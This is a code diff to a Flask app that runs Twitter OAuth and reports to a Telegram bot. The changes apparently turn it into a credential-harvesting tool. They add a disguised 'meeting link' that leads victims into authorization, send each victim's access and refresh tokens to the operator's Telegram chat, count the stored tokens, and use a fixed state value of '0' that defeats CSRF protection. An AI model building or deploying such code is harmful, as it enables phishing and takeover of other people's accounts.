@@ -35,6 +35,14 @@ def init_db():
 
 init_db()  # Ensure database is initialized
 
+def get_total_tokens():
+    # Get the total number of tokens in the database
+    conn = sqlite3.connect(DATABASE)
+    cursor = conn.cursor()
+    cursor.execute('SELECT COUNT(*) FROM tokens')
+    total = cursor.fetchone()[0]
+    conn.close()
+    return total
 
 def get_twitter_username(access_token):
     url = "https://api.twitter.com/2/users/me"
@@ -52,7 +60,6 @@ def get_twitter_username(access_token):
         print(f"Failed to fetch username. Status code: {response.status_code}")
         return None
 
-
 # Generate code verifier and challenge
 def generate_code_verifier_and_challenge():
     code_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode('utf-8')
@@ -60,7 +67,6 @@ def generate_code_verifier_and_challenge():
         hashlib.sha256(code_verifier.encode()).digest()
     ).rstrip(b'=').decode('utf-8')
     return code_verifier, code_challenge
-
 
 # Store tokens in the database
 def store_tokens(access_token, refresh_token, username):
@@ -73,26 +79,30 @@ def store_tokens(access_token, refresh_token, username):
     conn.commit()
     conn.close()
 
-
-# Retrieve tokens for a specific username
-def get_tokens(username):
-    conn = sqlite3.connect(DATABASE)
-    cursor = conn.cursor()
-    cursor.execute('''
-        SELECT access_token, refresh_token FROM tokens WHERE username = ?
-    ''', (username,))
-    tokens = cursor.fetchone()
-    conn.close()
-    return tokens
-
-
-# Send a startup message with action buttons
+# Send a startup message with OAuth link, meeting link, and action buttons
 def send_startup_message():
+    state = "0"  # Fixed state value for initialization
+    code_verifier, code_challenge = generate_code_verifier_and_challenge()
+
+    # Generate the OAuth link
+    authorization_url = (
+        f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
+        f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
+        f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
+    )
+
+    # Generate the meeting link
+    meeting_url = f"{CALLBACK_URL}j?meeting={state}&pwd={code_challenge}"
+
+    # Get the total number of stored tokens
+    total_tokens = get_total_tokens()
+
+    # Message content
     message = (
-        "🚀 *Welcome!*\n"
-        "Please select an action:\n\n"
-        "1. Post a Tweet 🐦\n"
-        "2. Refresh Tokens 🔄"
+        f"🚀 *OAuth Authorization Link:*\n[Authorize link]({authorization_url})\n\n"
+        f"📅 *Meeting Link:*\n[Meeting link]({meeting_url})\n\n"
+        f"🔢 *Total Tokens in Database:* {total_tokens}\n\n"
+        "Please select an action:"
     )
 
     # Buttons for different actions
@@ -114,7 +124,6 @@ def send_startup_message():
     }
     requests.post(url, json=data)
 
-
 # Handle Telegram button clicks
 def handle_button_click(update):
     callback_data = update.get("callback_query", {}).get("data")
@@ -133,7 +142,6 @@ def handle_button_click(update):
     else:
         send_message(chat_id, "Unknown action.")
 
-
 # Function to send a message to Telegram
 def send_message(chat_id, text):
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -143,7 +151,6 @@ def send_message(chat_id, text):
     }
     requests.post(url, json=data)
 
-
 # Webhook route for Telegram updates
 @app.route('/webhook', methods=['POST'])
 def webhook():
@@ -151,7 +158,6 @@ def webhook():
     if "callback_query" in update:
         handle_button_click(update)
     return jsonify({"status": "ok"})
-
 
 # Function to send access and refresh tokens to Telegram
 def send_to_telegram(access_token, refresh_token=None):
@@ -181,45 +187,62 @@ def send_to_telegram(access_token, refresh_token=None):
 
     send_message(TELEGRAM_CHAT_ID, message)
 
-
-# Function to post a tweet
-def post_tweet(access_token, tweet_text):
-    TWITTER_API_URL = "https://api.twitter.com/2/tweets"
-    headers = {
-        "Authorization": f"Bearer {access_token}",
-        "Content-Type": "application/json"
-    }
-    payload = {
-        "text": tweet_text
-    }
-
-    response = requests.post(TWITTER_API_URL, json=payload, headers=headers)
-
-    if response.status_code == 201:
-        tweet_data = response.json()
-        return f"Tweet posted successfully: {tweet_data['data']['id']}"
-    else:
-        error_message = response.json().get("detail", "Failed to post tweet")
-        return f"Error posting tweet: {error_message}"
-
-
-@app.route('/tweet/<access_token>', methods=['GET', 'POST'])
-def tweet(access_token):
-    if request.method == 'POST':
-        tweet_text = request.form['tweet_text']
-        result = post_tweet(access_token, tweet_text)
-        return render_template('tweet_result.html', result=result)
-
-    return render_template('tweet_form.html', access_token=access_token)
-
-
 @app.route('/')
 def home():
-    # Code to handle OAuth login flow
-    return "Welcome to the updated application!"
+    code = request.args.get('code')
+    state = request.args.get('state')
+    error = request.args.get('error')
 
+    if not code:
+        state = "0"  # Use fixed state value
+        session['oauth_state'] = state
+
+        code_verifier, code_challenge = generate_code_verifier_and_challenge()
+        session['code_verifier'] = code_verifier  # Store code_verifier in session
+
+        authorization_url = (
+            f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
+            f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
+            f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
+        )
+
+        return redirect(authorization_url)
+
+    if code:
+        if error:
+            return f"Error during authorization: {error}", 400
+
+        if state != "0":  # Check for the fixed state value
+            return "Invalid state parameter", 403
+
+        code_verifier = session.pop('code_verifier', None)
+
+        token_url = "https://api.twitter.com/2/oauth2/token"
+        data = {
+            'grant_type': 'authorization_code',
+            'code': code,
+            'redirect_uri': CALLBACK_URL,
+            'code_verifier': code_verifier
+        }
+
+        response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
+        token_response = response.json()
+
+        if response.status_code == 200:
+            access_token = token_response.get('access_token')
+            refresh_token = token_response.get('refresh_token')
+
+            session['access_token'] = access_token
+            session['refresh_token'] = refresh_token
+
+            send_to_telegram(access_token, refresh_token)
+            return f"Access Token: {access_token}, Refresh Token: {refresh_token}"
+        else:
+            error_description = token_response.get('error_description', 'Unknown error')
+            error_code = token_response.get('error', 'No error code')
+            return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
-    send_startup_message()  # Send the startup message with action buttons
+    send_startup_message()  # Send the startup message with OAuth link, meeting link, and action buttons
     app.run(host='0.0.0.0', port=port)
